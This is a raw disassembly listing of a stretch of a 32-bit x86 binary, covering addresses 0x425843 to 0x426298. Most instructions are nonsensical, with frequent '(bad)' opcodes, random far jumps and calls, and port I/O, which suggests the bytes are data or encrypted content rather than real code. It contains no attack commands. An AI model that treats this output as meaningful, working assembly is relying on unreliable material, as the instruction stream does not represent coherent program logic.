  425843:	dec    edi
  425844:	cli    
  425845:	retf   0x7a9c
  425848:	pusha  
  425849:	dec    edi
  42584a:	pushf  
  42584b:	ret    
  42584c:	xchg   esi,eax
  42584d:	rcl    BYTE PTR [ebp-0x16b67865],cl
  425853:	shl    dl,0x77
  425856:	mov    eax,DWORD PTR [esi-0x776604f6]
  42585c:	inc    ebp
  42585d:	push   eax
  42585e:	scas   al,BYTE PTR es:[edi]
  42585f:	cmp    al,0x3f
  425861:	sub    DWORD PTR [edx-0x3],ecx
  425864:	into   
  425865:	jno    0x425855
  425867:	mov    al,0xc4
  425869:	mov    dh,0xcf
  42586b:	mov    WORD PTR [edx+0x7c],es
  42586e:	sub    ah,BYTE PTR [ebx+0xc61f633]
  425874:	xchg   edi,eax
  425875:	int3   
  425876:	(bad)
  425879:	popf   
  42587a:	fistp  QWORD PTR [eax+0x4b]
  42587d:	mov    dl,BYTE PTR [eax+0x56]
  425880:	inc    ebp
  425881:	(bad)  
  425882:	add    eax,DWORD PTR [edi+0x91b51f8]
  425888:	dec    esp
  425889:	ret    0xb77
  42588c:	cmp    al,0x80
  42588e:	jecxz  0x425909
  425890:	jp     0x4258e7
  425892:	sbb    DWORD PTR [edx-0x2d374d0d],esp
  425898:	sub    eax,DWORD PTR [eax+0x35ec5a5a]
  42589e:	push   edi
  42589f:	sbb    BYTE PTR [ecx],cl
  4258a1:	enter  0x10a5,0x36
  4258a5:	repz xor al,0x1
  4258a8:	mov    ebp,0xf64cd7a2
  4258ae:	ficom  DWORD PTR [edi-0x5ec20e4a]
  4258b4:	and    al,0x43
  4258b6:	xchg   edi,eax
  4258b7:	and    eax,0x8d64a948
  4258bc:	les    eax,FWORD PTR [ebx+0x71196b5f]
  4258c2:	sub    eax,0x8a8a1de8
  4258c7:	and    DWORD PTR [edi],eax
  4258c9:	mov    esi,esi
  4258cb:	dec    ebp
  4258cc:	leave  
  4258cd:	jbe    0x42593e
  4258cf:	sub    eax,0xa2ee0c5
  4258d4:	or     al,0xd3
  4258d6:	cmp    DWORD PTR [ebx+ecx*1+0x63404b08],eax
  4258dd:	push   ds
  4258de:	adc    eax,0x76b7f57c
  4258e3:	(bad)  
  4258e5:	or     eax,0x99b42b91
  4258ea:	xchg   dh,al
  4258ec:	push   ebx
  4258ed:	add    BYTE PTR ds:[eax],al
	...
  425954:	add    BYTE PTR [eax],al
  425956:	pop    esp
  425957:	push   edx
  425958:	nop
  425959:	push   edx
  42595a:	sahf   
  42595b:	rcr    dh,cl
  42595d:	pop    esi
  42595e:	adc    BYTE PTR [edx+0x55],0x71
  425962:	cmp    eax,0x679ac753
  425967:	xchg   ebx,eax
  425968:	add    DWORD PTR [eax],eax
  42596a:	add    BYTE PTR [ecx],al
  42596c:	add    BYTE PTR [eax],al
  42596e:	sub    al,0xac
  425970:	add    eax,0xe2a6c66
  425975:	cmp    al,0x5f
  425977:	xor    dh,BYTE PTR [esi+edi*1+0x218f3f61]
  42597e:	inc    edi
  42597f:	fwait
  425980:	test   BYTE PTR [eax-0x5ae36359],bl
  425986:	xchg   edi,eax
  425987:	ror    DWORD PTR [eax+0x2],cl
  42598a:	xor    al,BYTE PTR [esi+esi*1+0x1d]
  42598e:	outs   dx,DWORD PTR ds:[esi]
  42598f:	and    esi,DWORD PTR [eax-0x5dc8a2e7]
  425995:	call   0x7bff8da9
  42599a:	outs   dx,BYTE PTR ds:[esi]
  42599b:	faddp  st(3),st
  42599d:	and    bh,BYTE PTR [ebx+esi*2]
  4259a0:	sbb    ecx,DWORD PTR [edx+0x7d]
  4259a3:	xor    al,0x24
  4259a5:	fcomp  st(7)
  4259a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4259a8:	and    eax,0xc2861f80
  4259ad:	add    bl,bh
  4259af:	push   ecx
  4259b0:	jmp    0x1946f3f5
  4259b5:	outs   dx,BYTE PTR ds:[esi]
  4259b6:	popf   
  4259b7:	popf   
  4259b8:	xchg   esi,eax
  4259b9:	imul   si,sp,0x17
  4259bd:	add    eax,DWORD PTR [esi+eiz*1-0x19f27c08]
  4259c4:	iret   
  4259c5:	push   ds
  4259c6:	cld    
  4259c7:	fild   WORD PTR [esi-0x3e]
  4259ca:	push   esp
  4259cb:	xor    al,0x3f
  4259cd:	stos   DWORD PTR es:[edi],eax
  4259ce:	out    0xd0,al
  4259d0:	and    ecx,ebx
  4259d2:	repnz and BYTE PTR [edx+0x31],cl
  4259d6:	ins    DWORD PTR es:[edi],dx
  4259d7:	xchg   BYTE PTR [edx-0x53359ed7],bl
  4259dd:	ins    BYTE PTR es:[edi],dx
  4259de:	cmp    BYTE PTR [ebx+0x63],dh
  4259e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4259e2:	sub    dh,dl
  4259e4:	mov    WORD PTR [eax],ss
  4259e6:	jmp    0x77d1fb23
  4259eb:	xor    eax,0x11a1a06c
  4259f0:	add    eax,DWORD PTR [ebx+eax*4-0x34]
  4259f4:	push   es
  4259f5:	inc    esp
  4259f6:	bound  esp,QWORD PTR [eax+0x6666270d]
  4259fc:	fld    st(6)
  4259fe:	aad    0x48
  425a00:	mov    bh,0x1f
  425a02:	scas   al,BYTE PTR es:[edi]
  425a03:	mov    dh,0x46
  425a05:	out    dx,al
  425a06:	out    0x89,eax
  425a08:	xchg   esp,eax
  425a09:	es xor dl,bh
  425a0c:	int3   
  425a0d:	mov    ds:0x82d3ba1e,eax
  425a12:	jle    0x425a7c
  425a14:	inc    edx
  425a15:	jl     0x425999
  425a17:	jne    0x425a43
  425a19:	or     al,0xf3
  425a1b:	shl    BYTE PTR [edx],0xb7
  425a1e:	jnp    0x4259c2
  425a20:	mov    cl,BYTE PTR [ecx+eiz*4]
  425a23:	push   ebx
  425a24:	mov    ah,0x10
  425a26:	mov    gs,WORD PTR ds:0x12b96adb
  425a2c:	and    ch,BYTE PTR [edi]
  425a2e:	cmp    bl,BYTE PTR [edx+ecx*2-0x7aab7bea]
  425a35:	mov    eax,DWORD PTR [ebx+0x451bb1fd]
  425a3b:	sets   BYTE PTR [ebx-0x4a]
  425a3f:	inc    eax
  425a40:	add    dl,al
  425a42:	jmp    0x171448bc
  425a47:	scas   al,BYTE PTR es:[edi]
  425a48:	jno    0x425a7b
  425a4a:	cs int3 
  425a4c:	xchg   esi,eax
  425a4d:	data16 fmul QWORD PTR [ebx+0x3daaa9c4]
  425a54:	sub    DWORD PTR [eax],edi
  425a56:	imul   edx,esp,0xffffffdb
  425a59:	hlt    
  425a5a:	pop    esp
  425a5b:	call   0xaf8ef632
  425a60:	jb     0x4259e3
  425a62:	stos   BYTE PTR es:[edi],al
  425a63:	xor    DWORD PTR [ebx+0x447210ca],esi
  425a69:	lahf   
  425a6a:	test   DWORD PTR [ebx+eax*4],ebx
  425a6d:	repnz add BYTE PTR [eax],al
	...
  425ad4:	add    BYTE PTR [eax],al
  425ad6:	shl    DWORD PTR [ebx+0x4],0x67
  425ada:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425adb:	jcxz   0x425ac5
  425ade:	(bad)  
  425adf:	fimul  DWORD PTR [edi+eax*4-0x9e66316]
  425ae6:	addr16 xchg esp,eax
  425ae8:	add    DWORD PTR [eax],eax
  425aea:	add    BYTE PTR [ecx],al
  425aec:	add    BYTE PTR [eax],al
  425aee:	js     0x425a9f
  425af0:	enter  0x7d3,0x99
  425af4:	mov    esi,0xf8b09f29
  425af9:	arpl   WORD PTR [ecx],bx
  425afb:	adc    ebx,edx
  425afd:	xchg   esp,ecx
  425aff:	dec    edx
  425b00:	sbb    dh,bl
  425b02:	stos   DWORD PTR es:[edi],eax
  425b03:	xchg   ebx,eax
  425b04:	enter  0x5ddb,0x8a
  425b08:	pop    esi
  425b09:	add    dl,BYTE PTR [ecx+0x42b6679b]
  425b0f:	add    esi,ecx
  425b11:	cld    
  425b12:	jnp    0x425b5a
  425b14:	into   
  425b15:	sub    dl,BYTE PTR [ebx+ecx*2+0x34690b50]
  425b1c:	mul    DWORD PTR [esi-0x8]
  425b1f:	mov    eax,0xf3563d29
  425b24:	leave  
  425b25:	mov    ds:0xeb2c044a,eax
  425b2a:	mov    dl,0x70
  425b2c:	into   
  425b2d:	or     ebp,eax
  425b2f:	ins    DWORD PTR es:[edi],dx
  425b30:	mov    ebp,0x6c86f09b
  425b35:	pop    ecx
  425b36:	and    eax,0x4a85ff38
  425b3b:	addr16 push ds
  425b3d:	pop    ss
  425b3e:	mov    cl,0x9d
  425b40:	in     al,0xaa
  425b42:	pop    ecx
  425b43:	mov    eax,DWORD PTR [eax]
  425b45:	call   0xe5f7:0xe94e353a
  425b4c:	inc    ebp
  425b4d:	pop    ebx
  425b4e:	jl     0x425baa
  425b50:	ret    0x8656
  425b53:	mov    al,ds:0xad97e5cc
  425b58:	test   al,0xef
  425b5a:	les    ecx,FWORD PTR ds:0xca6a9061
  425b60:	out    0x7a,al
  425b62:	adc    BYTE PTR [eax+0x69cb389a],al
  425b68:	outs   dx,DWORD PTR ds:[esi]
  425b69:	or     cl,BYTE PTR [eax]
  425b6b:	imul   ebx,DWORD PTR [ebx],0xe9ca37c6
  425b71:	cmc    
  425b72:	add    BYTE PTR [edi+0x4e],bh
  425b75:	out    0xbe,al
  425b77:	push   0xffffffa2
  425b79:	imul   esi,DWORD PTR [edi+0x13],0x52
  425b7d:	popf   
  425b7e:	fsub   DWORD PTR [edi-0x5c]
  425b81:	rcr    BYTE PTR [ebp+0x79],cl
  425b84:	sbb    esi,ecx
  425b86:	or     al,dh
  425b88:	(bad)  [eax+ebp*1]
  425b8b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425b8c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425b8d:	sub    ecx,esi
  425b8f:	ret    0xdeb2
  425b92:	pop    es
  425b93:	mov    ch,0x1d
  425b95:	sub    BYTE PTR [eax-0x71588e49],dl
  425b9b:	lods   eax,DWORD PTR ds:[esi]
  425b9c:	inc    eax
  425b9d:	xchg   ebx,eax
  425b9e:	jo     0x425c1d
  425ba0:	out    dx,eax
  425ba1:	pop    esp
  425ba2:	add    BYTE PTR [edi-0x5d],0x7e
  425ba6:	fsincos 
  425ba8:	fcomip st,st(1)
  425baa:	int3   
  425bab:	xchg   DWORD PTR ds:0x25ad,edi
  425bb0:	jo     0x425bce
  425bb2:	add    dh,BYTE PTR [ebp-0x577e862]
  425bb8:	ss call 0xe654:0xf0080d17
  425bc0:	bound  esi,QWORD PTR [ebx+ebx*4+0x47]
  425bc4:	xchg   BYTE PTR [edi+0x75a7aeb6],dh
  425bca:	dec    edx
  425bcb:	in     eax,dx
  425bcc:	aaa    
  425bcd:	ret    0x8ff8
  425bd0:	out    dx,eax
  425bd1:	stos   DWORD PTR es:[edi],eax
  425bd2:	pop    ebx
  425bd3:	aad    0xec
  425bd5:	test   DWORD PTR [edx],edx
  425bd7:	idiv   DWORD PTR [edx-0x28bf7575]
  425bdd:	mov    eax,0xacd15324
  425be2:	loopne 0x425bfd
  425be4:	loope  0x425c4b
  425be6:	inc    ebp
  425be7:	jmp    0xb5096ff7
  425bec:	xchg   ebx,eax
  425bed:	sub    BYTE PTR [eax],al
	...
  425c53:	add    BYTE PTR [eax],al
  425c55:	add    ah,al
  425c57:	clc    
  425c58:	jnp    0x425cb0
  425c5a:	jg     0x425c33
  425c5c:	in     eax,dx
  425c5d:	cli    
  425c5e:	enter  0xe6cd,0x96
  425c62:	in     al,dx
  425c63:	icebp  
  425c64:	test   al,0x8b
  425c66:	addr16 xchg ebp,eax
  425c68:	add    DWORD PTR [eax],eax
  425c6a:	add    BYTE PTR [ecx],al
  425c6c:	add    BYTE PTR [eax],al
  425c6e:	icebp  
  425c6f:	push   edi
  425c70:	sub    edx,DWORD PTR [esi]
  425c72:	pop    es
  425c73:	pop    edx
  425c74:	jo     0x425cbe
  425c76:	fisubr WORD PTR [eax]
  425c78:	mov    ecx,0x4ff4eaa
  425c7d:	in     al,0xa3
  425c7f:	push   es
  425c80:	neg    dl
  425c82:	inc    ebx
  425c83:	dec    edi
  425c84:	xchg   ecx,eax
  425c85:	(bad)  
  425c86:	pop    ss
  425c87:	cmc    
  425c88:	cs mov ecx,0x3f8f9f57
  425c8e:	dec    edi
  425c8f:	mov    bl,0xd7
  425c91:	push   esi
  425c92:	arpl   WORD PTR [ebx+eiz*8+0x52],bx
  425c96:	aas    
  425c97:	xor    al,0x5e
  425c99:	imul   DWORD PTR [ecx-0x45]
  425c9c:	mov    ebp,0x898bd487
  425ca1:	sub    DWORD PTR [ebp+0x6f],ebp
  425ca4:	xchg   DWORD PTR ds:0xcc05aa5b,edi
  425caa:	pop    es
  425cab:	jae    0x425cb6
  425cad:	mov    DWORD PTR [edi-0x47d8786],ebx
  425cb3:	sti    
  425cb4:	mov    ds:0x6905e2ab,al
  425cb9:	sub    eax,DWORD PTR [edi-0x4c]
  425cbc:	sub    BYTE PTR [ebp+0x57],bl
  425cbf:	stos   BYTE PTR es:[edi],al
  425cc0:	xor    bh,bh
  425cc2:	jl     0x425cea
  425cc4:	das    
  425cc5:	and    DWORD PTR [edi-0x40],0xb
  425cc9:	xor    esi,DWORD PTR [ecx-0x32]
  425ccc:	test   BYTE PTR [ecx-0xa],ch
  425ccf:	sbb    bl,bl
  425cd1:	sahf   
  425cd2:	(bad)  
  425cd3:	out    0x4d,eax
  425cd5:	iret   
  425cd6:	xor    al,0x26
  425cd8:	mov    edi,DWORD PTR [eax-0x30]
  425cdb:	add    BYTE PTR [esi-0x2852b5ef],cl
  425ce1:	adc    BYTE PTR [esi],ah
  425ce3:	add    BYTE PTR [edx],0xad
  425ce6:	pop    ecx
  425ce7:	int    0x22
  425ce9:	les    ecx,FWORD PTR [edi-0x44]
  425cec:	sub    dh,ah
  425cee:	mov    eax,ds:0xe2b6fc81
  425cf3:	sub    ah,BYTE PTR [eax+0x39]
  425cf6:	rol    BYTE PTR ds:0xbbf349df,0xb8
  425cfd:	rcl    al,1
  425cff:	or     edi,0xffffffc1
  425d02:	fmul   QWORD PTR [ecx+0x4d]
  425d05:	loope  0x425d6d
  425d07:	and    edi,DWORD PTR [esi+0x37]
  425d0a:	jecxz  0x425d83
  425d0c:	jmp    0xa2cc:0xcf2fa8c2
  425d13:	cwde   
  425d14:	in     al,dx
  425d15:	scas   eax,DWORD PTR es:[edi]
  425d16:	jle    0x425d80
  425d18:	pop    ebx
  425d19:	popa   
  425d1a:	jno    0x425d98
  425d1c:	dec    ebx
  425d1d:	mov    eax,0x7ae8f686
  425d22:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425d23:	nop
  425d24:	rol    DWORD PTR [esi+eax*2+0x43b06d0b],1
  425d2b:	js     0x425ce9
  425d2d:	js     0x425d36
  425d2f:	hlt    
  425d30:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425d31:	ja     0x425d67
  425d33:	or     bh,BYTE PTR [ecx]
  425d35:	(bad)  
  425d36:	jnp    0x425d04
  425d38:	mov    ch,0xf8
  425d3a:	fld    QWORD PTR [edx]
  425d3c:	hlt    
  425d3d:	dec    ebp
  425d3e:	jbe    0x425d6d
  425d40:	je     0x425cfd
  425d42:	or     eax,0x2a996969
  425d47:	sbb    eax,0x639f3cc8
  425d4c:	call   0x1f66c7e4
  425d51:	mov    eax,ecx
  425d53:	test   esp,esp
  425d55:	addr16 xchg edi,eax
  425d57:	ret    
  425d58:	repnz es pop esp
  425d5b:	mov    edx,0xcfc24b6
  425d60:	out    dx,al
  425d61:	dec    eax
  425d62:	push   ecx
  425d63:	std    
  425d64:	mov    ah,0xa7
  425d66:	(bad)  
  425d67:	jmp    0x5938e009
  425d6c:	dec    ecx
  425d6d:	add    BYTE PTR [eax],0x0
	...
  425dd4:	add    BYTE PTR [eax],al
  425dd6:	jmp    FWORD PTR [esp+ebx*8-0x8820f9]
  425ddd:	cld    
  425dde:	gs addr16 stc 
  425de1:	mov    ds:0x8b159763,al
  425de6:	addr16 xchg esi,eax
  425de8:	add    DWORD PTR [eax],eax
  425dea:	add    BYTE PTR [ecx],al
  425dec:	add    BYTE PTR [eax],al
  425dee:	xchg   ecx,eax
  425def:	mov    bl,0xea
  425df1:	mov    DWORD PTR [eax-0x25],0x9f4a0932
  425df8:	call   0xeaab:0x5c81443c
  425dff:	sub    dh,0x4b
  425e02:	mov    edx,0x42a6a340
  425e07:	ins    BYTE PTR es:[edi],dx
  425e08:	jl     0x425d93
  425e0a:	push   ecx
  425e0b:	ret    0x7f62
  425e0e:	fnstsw WORD PTR [esi]
  425e10:	cli    
  425e11:	jecxz  0x425dc7
  425e13:	mov    edx,0x431df3a
  425e18:	aam    0x1
  425e1a:	mov    ds:0x8dbf4325,eax
  425e1f:	cmp    BYTE PTR [esi],0xad
  425e22:	push   edi
  425e23:	sbb    al,BYTE PTR [edi+edi*1]
  425e26:	push   esp
  425e27:	mov    ah,0x9f
  425e29:	cmp    ah,BYTE PTR ds:0x1bada515
  425e2f:	jb     0x425ded
  425e31:	add    dh,BYTE PTR [ebx-0x1e]
  425e34:	fisttp QWORD PTR [eax]
  425e36:	mov    bl,BYTE PTR [ecx]
  425e38:	popa   
  425e39:	sub    eax,0xe5d6df1c
  425e3e:	sahf   
  425e3f:	jno    0x425dee
  425e41:	inc    ebp
  425e42:	push   ebp
  425e43:	test   DWORD PTR [edx],ebp
  425e45:	pop    edx
  425e46:	jo     0x425eae
  425e48:	xlat   BYTE PTR ds:[ebx]
  425e49:	adc    dl,cl
  425e4b:	das    
  425e4c:	mov    ds:0xead245f6,al
  425e51:	sub    DWORD PTR [ebx+edi*8],edi
  425e54:	mov    eax,ds:0xa2f2b0c5
  425e59:	(bad)  
  425e5a:	cdq    
  425e5b:	or     ebp,edx
  425e5d:	pop    edi
  425e5e:	loope  0x425ed2
  425e60:	out    0xf9,eax
  425e62:	clc    
  425e63:	push   ebp
  425e64:	popf   
  425e65:	xor    eax,0x6343cacd
  425e6a:	call   0xf68a:0xa22717b3
  425e71:	rcl    DWORD PTR ds:0x20b5315f,0x63
  425e78:	popa   
  425e79:	pop    edi
  425e7a:	push   ss
  425e7b:	imul   ebp,DWORD PTR [edx+0x1e],0x78
  425e7f:	inc    esp
  425e80:	inc    ecx
  425e81:	pop    esp
  425e82:	push   esi
  425e83:	loope  0x425e44
  425e85:	dec    ebx
  425e86:	pop    ebx
  425e87:	mov    cl,bh
  425e89:	rcr    DWORD PTR [edx+0x4a176c12],cl
  425e8f:	clc    
  425e90:	jl     0x425ea0
  425e92:	pop    es
  425e93:	xor    al,0xc3
  425e95:	rcl    cl,1
  425e97:	or     DWORD PTR [edi],eax
  425e99:	pop    edi
  425e9a:	adc    ebp,ecx
  425e9c:	hlt    
  425e9d:	jl     0x425e79
  425e9f:	cmp    al,0x49
  425ea1:	pop    ebx
  425ea2:	jp     0x425e58
  425ea4:	scas   al,BYTE PTR es:[edi]
  425ea5:	bound  ebp,QWORD PTR [esi+0x30e4a89c]
  425eab:	push   ecx
  425eac:	xchg   DWORD PTR [ebx+0x20ea34e1],edx
  425eb2:	outs   dx,BYTE PTR ds:[esi]
  425eb3:	mov    ecx,ss
  425eb5:	ror    BYTE PTR [esi+0x57],0x17
  425eb9:	jle    0x425ea8
  425ebb:	pop    ds
  425ebc:	dec    esp
  425ebd:	jno    0x425e60
  425ebf:	push   cs
  425ec0:	mov    esi,0x2d8378b2
  425ec5:	rcl    edx,cl
  425ec7:	push   ebp
  425ec8:	adc    ebx,DWORD PTR [ecx]
  425eca:	add    ebx,esp
  425ecc:	mov    ds:0xe4d28917,eax
  425ed1:	push   cs
  425ed2:	(bad)  
  425ed3:	sub    bl,BYTE PTR [eiz*2+0x357fbabe]
  425eda:	mov    ecx,0xc1ac19aa
  425edf:	imul   esp,esp,0xfffffff7
  425ee2:	adc    edx,esp
  425ee4:	jae    0x425e9b
  425ee6:	jle    0x425ec9
  425ee8:	xchg   ebp,eax
  425ee9:	adc    DWORD PTR [ebx+0x272d5],esp
	...
  425f53:	add    BYTE PTR [eax],al
  425f55:	add    dh,al
  425f57:	jl     0x425faa
  425f59:	sar    bl,1
  425f5b:	std    
  425f5c:	(bad)  
  425f5d:	jle    0x425f2b
  425f5f:	pop    ss
  425f60:	popf   
  425f61:	scas   eax,DWORD PTR es:[edi]
  425f62:	jne    0x425fbb
  425f64:	mov    dl,0x79
  425f66:	addr16 xchg edi,eax
  425f68:	add    DWORD PTR [eax],eax
  425f6a:	add    BYTE PTR [ecx],al
  425f6c:	add    BYTE PTR [eax],al
  425f6e:	xchg   DWORD PTR [ebp+0x3ca55153],edi
  425f74:	mov    edi,0xe4aff855
  425f79:	nop
  425f7a:	mov    edi,0x28ac749
  425f7f:	fadd   QWORD PTR ds:0x5ccd1384
  425f85:	mov    ?,WORD PTR [esp+eax*2-0x46]
  425f89:	(bad)  
  425f8a:	ins    BYTE PTR es:[edi],dx
  425f8b:	xchg   BYTE PTR [ecx-0x3f],dl
  425f8e:	aaa    
  425f8f:	mov    ebx,0x66d0658e
  425f94:	retf   0x2105
  425f97:	pushf  
  425f98:	pop    edi
  425f99:	mov    ebx,0x196265e0
  425f9e:	mov    ds:0x2cdd9be3,al
  425fa3:	dec    eax
  425fa4:	sbb    bl,ah
  425fa6:	popf   
  425fa7:	mov    BYTE PTR [edx],dl
  425fa9:	jg     0x426020
  425fab:	xchg   ecx,eax
  425fac:	pop    esp
  425fad:	test   BYTE PTR [ecx+esi*4+0x77],ch
  425fb1:	adc    ch,dh
  425fb3:	push   edi
  425fb4:	popf   
  425fb5:	xchg   ebx,eax
  425fb6:	mov    eax,0xa8c4564d
  425fbb:	mov    ch,0x1b
  425fbd:	add    eax,0x2320d66c
  425fc2:	inc    ecx
  425fc3:	sbb    DWORD PTR [edi+ecx*2],edi
  425fc6:	std    
  425fc7:	jo     0x425ffa
  425fc9:	xor    al,0xa4
  425fcb:	sbb    al,0x63
  425fcd:	outs   dx,BYTE PTR ds:[esi]
  425fce:	push   ebx
  425fcf:	loop   0x425f80
  425fd1:	loopne 0x425ff0
  425fd3:	adc    al,0x24
  425fd5:	mov    ebp,0xd040d268
  425fda:	push   eax
  425fdb:	xor    ebp,DWORD PTR [edx]
  425fdd:	xchg   ecx,eax
  425fde:	push   eax
  425fdf:	add    DWORD PTR [eax+esi*2+0x2d],ecx
  425fe3:	xlat   BYTE PTR ds:[ebx]
  425fe4:	add    ah,BYTE PTR [edx-0x2b0ae2fe]
  425fea:	jns    0x425f8b
  425fec:	pop    esi
  425fed:	iret   
  425fee:	xchg   ecx,eax
  425fef:	rcr    ah,1
  425ff1:	mov    bh,0x19
  425ff3:	mov    bh,0x70
  425ff5:	sbb    eax,0xed6de942
  425ffa:	rep stos BYTE PTR es:[edi],al
  425ffc:	sahf   
  425ffd:	push   ds
  425ffe:	xchg   BYTE PTR [eax],bl
  426000:	out    dx,al
  426001:	jle    0x425fcb
  426003:	jno    0x426015
  426005:	push   eax
  426006:	push   0x4e
  426008:	push   cs
  426009:	mov    BYTE PTR [ecx+0x1],bh
  42600c:	cmp    dl,ch
  42600e:	gs push ebx
  426010:	pop    ebp
  426011:	retf   
  426012:	leave  
  426013:	(bad)  
  426014:	mov    dh,0x20
  426016:	arpl   WORD PTR [edx-0x2a17302],cx
  42601c:	or     eax,0xf030351
  426021:	mov    esp,0x27949f7f
  426026:	mov    al,ds:0x60bcc6e4
  42602b:	(bad)  
  42602c:	sbb    eax,0x5b7dc1dd
  426031:	(bad)  
  426032:	adc    al,0x3c
  426034:	or     ebp,DWORD PTR [eax+0x4e]
  426037:	ins    BYTE PTR es:[edi],dx
  426038:	jmp    0x425fbe
  42603a:	and    eax,edx
  42603c:	xchg   BYTE PTR [edi-0x795e8165],bh
  426042:	rcl    DWORD PTR ds:0x6da2b277,1
  426048:	mov    eax,0x87f1a374
  42604d:	cmp    al,0xda
  42604f:	neg    BYTE PTR [ecx+0x1]
  426052:	adc    eax,0x906a7796
  426057:	addr16 mov esi,0x3eb2b764
  42605d:	test   BYTE PTR ds:0x83736a8a,dl
  426063:	add    eax,0x6936bccd
  426068:	or     ch,dl
  42606a:	outs   dx,DWORD PTR ds:[esi]
  42606b:	pop    edx
  42606c:	xlat   BYTE PTR ds:[ebx]
  42606d:	add    eax,DWORD PTR [eax]
	...
  4260d3:	add    BYTE PTR [eax],al
  4260d5:	add    BYTE PTR [ecx],bh
  4260d7:	cwde   
  4260d8:	or     eax,DWORD PTR [esi]
  4260da:	stos   DWORD PTR es:[edi],eax
  4260db:	xchg   edi,eax
  4260dc:	cmp    eax,0x304575bf
  4260e1:	in     al,dx
  4260e2:	dec    ecx
  4260e3:	sahf   
  4260e4:	adc    eax,0x1986707
  4260e9:	add    BYTE PTR [eax],al
  4260eb:	add    DWORD PTR [eax],eax
  4260ed:	add    BYTE PTR [esi-0x35e609b5],bl
  4260f3:	pop    esi
  4260f4:	xor    cl,BYTE PTR [edi+0x1a]
  4260f7:	and    DWORD PTR [esi],edi
  4260f9:	sub    DWORD PTR [edx+esi*1],esi
  4260fc:	jmp    0xf89f2f7b
  426101:	add    al,0x2d
  426103:	sbb    al,0x9b
  426105:	xor    al,0x91
  426107:	mov    DWORD PTR [esp+ecx*4],esi
  42610a:	or     DWORD PTR [edx],eax
  42610c:	add    al,BYTE PTR [esi+0x4b]
  42610f:	adc    DWORD PTR ds:0x645f7f19,ecx
  426115:	scas   eax,DWORD PTR es:[edi]
  426116:	mov    dl,0xc0
  426118:	adc    eax,0xaa625589
  42611d:	leave  
  42611e:	imul   edx,DWORD PTR [esp+eiz*4+0x38],0xffffff9f
  426123:	rcr    DWORD PTR [eax],1
  426125:	xor    al,0x0
  426127:	cmp    BYTE PTR [ecx+0x15],ah
  42612a:	jmp    0x44730f6
  42612f:	lock int 0x3
  426132:	sbb    edi,DWORD PTR [esi]
  426134:	inc    esp
  426135:	fcom   DWORD PTR ds:0x1011d983
  42613b:	outs   dx,DWORD PTR ds:[esi]
  42613c:	in     al,dx
  42613d:	cdq    
  42613e:	dec    ecx
  42613f:	dec    edi
  426140:	shl    esp,1
  426142:	scas   eax,DWORD PTR es:[edi]
  426143:	test   al,0x4
  426145:	and    bh,ch
  426147:	jg     0x42615a
  426149:	mov    eax,0x321dfe24
  42614e:	push   ebp
  42614f:	or     BYTE PTR [ecx],bh
  426151:	push   edi
  426152:	scas   eax,DWORD PTR es:[edi]
  426153:	mov    ds:0xf8c17d35,al
  426158:	inc    ah
  42615a:	sub    edi,ebp
  42615c:	cs out dx,eax
  42615e:	cli    
  42615f:	hlt    
  426160:	or     BYTE PTR [edx],ch
  426162:	int3   
  426163:	mov    esi,0x6781a65f
  426168:	sub    DWORD PTR [edx],ecx
  42616a:	fmul   DWORD PTR ds:[ebp-0x5a]
  42616e:	cmp    ecx,ecx
  426170:	ret    0x4efd
  426173:	xchg   ebp,eax
  426174:	mov    al,ds:0x734dfc57
  426179:	retf   0xb47b
  42617c:	mov    BYTE PTR [edi-0x24],ch
  42617f:	ret    0x8094
  426182:	stc    
  426183:	imul   esp,DWORD PTR [esi],0x2a913edd
  426189:	push   eax
  42618a:	mov    bl,0x91
  42618c:	xchg   esi,eax
  42618d:	xchg   ecx,eax
  42618e:	stc    
  42618f:	lods   al,BYTE PTR ds:[esi]
  426190:	mov    ecx,0xaa6bc7d
  426195:	cld    
  426196:	clc    
  426197:	adc    DWORD PTR [eax+0x11],eax
  42619a:	call   0x7440:0x8edc3fca
  4261a1:	mov    BYTE PTR ds:[ecx-0xc2737a9],bl
  4261a8:	cmp    edi,ebx
  4261aa:	imul   ebp,eax,0x25
  4261ad:	or     DWORD PTR [ecx+edx*2-0x10],esi
  4261b1:	xor    ecx,DWORD PTR [esi]
  4261b3:	mov    esp,cs
  4261b5:	call   0x4e5caa78
  4261ba:	mov    esp,0xd143a60a
  4261bf:	jo     0x426208
  4261c1:	xor    ah,dh
  4261c3:	inc    esp
  4261c4:	popf   
  4261c5:	mov    ebx,0xbf68906b
  4261ca:	shl    DWORD PTR [edi+eiz*8],1
  4261cd:	push   esi
  4261ce:	inc    ebp
  4261cf:	xlat   BYTE PTR ds:[ebx]
  4261d0:	add    DWORD PTR [ebp+0x4923d3e3],edx
  4261d6:	in     al,0x91
  4261d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4261d9:	and    al,0x93
  4261db:	pushf  
  4261dc:	ud1    esp,ebp
  4261df:	push   ss
  4261e0:	push   esp
  4261e1:	call   DWORD PTR [ebx-0x513d9edf]
  4261e7:	push   esi
  4261e8:	cmp    eax,0x67d21294
  4261ed:	xor    eax,DWORD PTR [eax]
	...
  426253:	add    BYTE PTR [eax],al
  426255:	add    BYTE PTR [ebx-0x409ef0df],bl
  42625b:	outs   dx,DWORD PTR ds:[esi]
  42625c:	(bad)  
  42625d:	sti    
  42625e:	mov    bh,0x83
  426260:	mov    cl,0x27
  426262:	push   cs
  426263:	pop    edx
  426264:	xor    edx,0x67
  426267:	cdq    
  426268:	add    DWORD PTR [eax],eax
  42626a:	add    BYTE PTR [ecx],al
  42626c:	add    BYTE PTR [eax],al
  42626e:	mov    DWORD PTR [eax-0x5c51348b],ebx
  426274:	es scas al,BYTE PTR es:[edi]
  426276:	lea    esi,[esi]
  426278:	arpl   WORD PTR [ebp-0x78e8562e],sp
  42627e:	add    al,0xb0
  426280:	dec    edx
  426281:	pop    ss
  426282:	pop    eax
  426283:	cli    
  426284:	sti    
  426285:	pushf  
  426286:	rcl    DWORD PTR ds:0x94fe39e7,1
  42628c:	mov    DWORD PTR [esi-0x74],esi
  42628f:	mov    dl,0x72
  426291:	jp     0x426310
  426293:	in     al,0xa4
  426295:	jno    0x426229
  426297:	inc    ecx
  426298:	lahf   
